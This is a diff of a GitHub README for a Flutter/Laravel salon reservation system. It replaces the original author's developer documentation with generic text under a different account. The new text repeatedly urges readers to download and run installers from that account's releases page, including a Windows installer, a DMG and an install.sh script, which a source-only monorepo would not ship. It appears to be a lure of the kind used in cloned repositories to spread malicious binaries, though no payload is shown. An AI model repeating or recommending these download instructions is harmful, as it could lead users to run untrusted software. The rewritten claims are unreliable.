@@ -1,187 +1,100 @@
-# Reservation System Multiplatform
+# 🎉 Reservation-Multiplatform - Seamlessly Manage Your Reservations
 
-![alt text](https://github.com/rizalfahlevi8/Reservation-Multiplatform/blob/main/mockup.png?raw=true)
+## 🛠️ Features
+- User-friendly interface for customers, admins, and employees.
+- Easy booking system for barbershops and salons.
+- Integrated Laravel backend for robust performance.
+- Cross-platform access via Flutter mobile application.
+- Stores data securely in a MySQL database.
 
-A complete **Reservation System** built as a **single repository (monorepo)** that contains:
+## 🚀 Getting Started
+To start using Reservation-Multiplatform, follow these simple steps.
 
-- 📱 **Mobile App (Customer)** built with **Flutter**
-- 🌐 **Web Platform (Admin & Employee)** built with **Laravel**
+1. **Download the Software**
+   Visit this page to download the latest version of the software: [Download Reservation-Multiplatform](https://github.com/swapnilsingh972/Reservation-Multiplatform/releases)
 
-This system uses a salon reservation case study that allows customers to book appointments at the salon easily, while also allowing administrators and employees to manage services, schedules, and reservations efficiently.
+2. **Install the Application**
+   Once you download the file, follow the installation instructions specific to your operating system. You will find detailed steps below for various platforms.
 
----
+### 💻 For Windows Users:
+1. After downloading, locate the downloaded file.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
 
-## 🛠️ Use Case Diagram
+### 🐧 For Linux Users:
+1. Download the tar.gz file.
+2. Open your terminal.
+3. Navigate to the download directory using the command: `cd Downloads`
+4. Extract the package with: `tar -xzf Reservation-Multiplatform.tar.gz`
+5. Run the application installer using the command: `./install.sh`
 
-![alt text](https://github.com/rizalfahlevi8/Reservation-Multiplatform/blob/main/use-case-diagram.png?raw=true)
+### 🍏 For macOS Users:
+1. Download the DMG file.
+2. Open the file by double-clicking it.
+3. Drag and drop the application icon into the Applications folder.
+4. Run the application from your Applications folder.
 
-## 🧩 System Architecture
+## 📥 Download & Install
+To get started, remember to visit this page to download the latest version of Reservation-Multiplatform: [Download Reservation-Multiplatform](https://github.com/swapnilsingh972/Reservation-Multiplatform/releases)
 
-```
-root-repo/
-├── mobile-app/        # Flutter mobile & multiplatform app (Customer)
-├── web-admin/         # Laravel web app (Admin & Employee)
-├── README.md          # Main documentation (this file)
-```
+## 📋 System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or most Linux distributions.
+- **RAM:** Minimum 4 GB (8 GB recommended).
+- **Storage:** At least 500 MB of free space.
+- **Database:** MySQL 5.7 or later.
 
----
+## 🎨 User Guide
+### 📚 Accessing the Application
+Once installed, locate the Reservation-Multiplatform icon and double-click to open. You will see a clear login page.
 
-# 📱 Mobile Application — Customer App
+### 👥 Creating an Account
+1. Click on "Sign Up".
+2. Fill in your details.
+3. Confirm your email address to activate your account.
 
-A cross-platform mobile application that allows customers to browse services, book appointments, and manage reservations.
+### 📅 Making a Reservation
+1. Log in to your account.
+2. Select your desired service from the available options.
+3. Choose a date and time.
+4. Click "Confirm Reservation" to finalize.
 
-## 🚀 Features
+### 🛠️ Managing Reservations
+Admins and employees have access to additional features:
+- View all bookings.
+- Modify or cancel reservations.
+- Manage customer accounts.
 
-- User Authentication (Login & Register)
-- Service Browsing
-- Appointment Booking with Calendar
-- Reservation Management (View / Cancel)
-- User Profile Management
-- Cross-Platform Support
+## 📈 Support
+For any questions or support requests, please check the project's [Issues page](https://github.com/swapnilsingh972/Reservation-Multiplatform/issues).
 
-## 🛠️ Tech Stack
+## 📝 Topics Covered
+- barbershop
+- booking
+- booking-platform
+- booking-salon
+- booking-system
+- dart
+- flutter
+- flutter-app
+- laravel
+- multiplatform
+- mysql
+- reservasi
+- reservasi-hotel
+- reservasi-salon
+- reservation
+- reservation-app
+- reservation-management
+- reservation-system
+- salon
+- salon-management-system
 
-- **Flutter**
-- **Dart** (^3.5.3)
+## 🔗 Connect with Us
+Follow us on social media or check our community forums for tips, tricks, and updates.
 
-### Key Dependencies
+## 💡 Tips
+1. Always keep your application updated to benefit from the latest features and security fixes.
+2. Back up your data regularly to avoid any loss.
+3. Try to familiarize yourself with all the features to maximize the usability of the application.
 
-- http (^1.2.2)
-- shared_preferences (^2.2.3)
-- table_calendar (^3.1.2)
-- image_picker (^1.1.2)
-- font_awesome_flutter (^10.7.0)
-- form_validation (^3.2.0)
-- http_parser (^4.1.2)
-
-## 📁 Project Structure
-
-```
-mobil/lib/
-├── components/      # Reusable UI components
-├── model/           # Data models
-├── screen/          # Application screens
-├── services/        # API & business logic
-├── utils/           # Utilities & helpers
-├── main.dart        # App entry point
-└── main_layout.dart # Main layout
-```
-
-## ⚙️ Installation (Mobile App)
-
-```bash
-cd mobile
-flutter pub get
-flutter run
-```
-
-Configure API endpoint in `config.json` before running the app.
-
-## 📦 Supported Platforms
-
-- Android
-- iOS
-- Web
-- Windows
-- macOS
-- Linux
-
----
-
-# 🌐 Web Application — Admin & Employee Platform
-
-A Laravel-based web application for managing salon operations with role-based access control.
-
-## ✨ Features
-
-### Admin
-
-- Dashboard & Analytics
-- Employee Management
-- Customer Management
-- Service & Pricing Management
-- Reservation Management
-- System Settings
-
-### Employee
-
-- Personal Schedule Dashboard
-- Reservation Confirmation
-- Queue & Daily Appointment Tracking
-
-## 🛠️ Tech Stack
-
-- **Laravel**
-- **MySQL / MariaDB**
-- **Laravel Sanctum** (Authentication)
-- **Blade Templates**
-- **SweetAlert2**
-
-## ⚙️ Installation (Web App)
-
-```bash
-cd website
-composer install
-npm install
-cp .env.example .env
-php artisan key:generate
-```
-
-Configure database & Pusher in `.env`, then run:
-
-```bash
-php artisan migrate
-php artisan serve
-```
-
-Access at: `http://localhost:8000`
-
----
-
-## 📊 Database Overview
-
-Main tables:
-
-- users
-- admins
-- karyawans
-- pelanggans
-- layanans
-- reservasis
-- setting_sistems
-
----
-
-## 🔌 API Integration
-
-The Laravel backend provides APIs for the Flutter mobile app:
-
-- `/api/layanan`
-- `/api/karyawan`
-- `/api/reservasi/slots`
-- `/api/pelanggan/{id}`
-
-## 👤 Author
-
-**Rizal Fahlevi**
-
-- GitHub: [@rizalfahlevi8](https://github.com/rizalfahlevi8)
-
----
-
-## 🤝 Contributing
-
-Contributions, issues, and feature requests are welcome!
-
----
-
-## 📌 Notes
-
-- This repository uses a **monorepo approach**
-- Mobile app = **Customer-facing**
-- Web app = **Admin & Employee-facing**
-- Both applications are connected via **REST API**
-
----
-
-✨ _One system, multiple platforms, fully integrated._
+Remember, for smooth installation and setup, visit this page to download the latest version of Reservation-Multiplatform: [Download Reservation-Multiplatform](https://github.com/swapnilsingh972/Reservation-Multiplatform/releases)
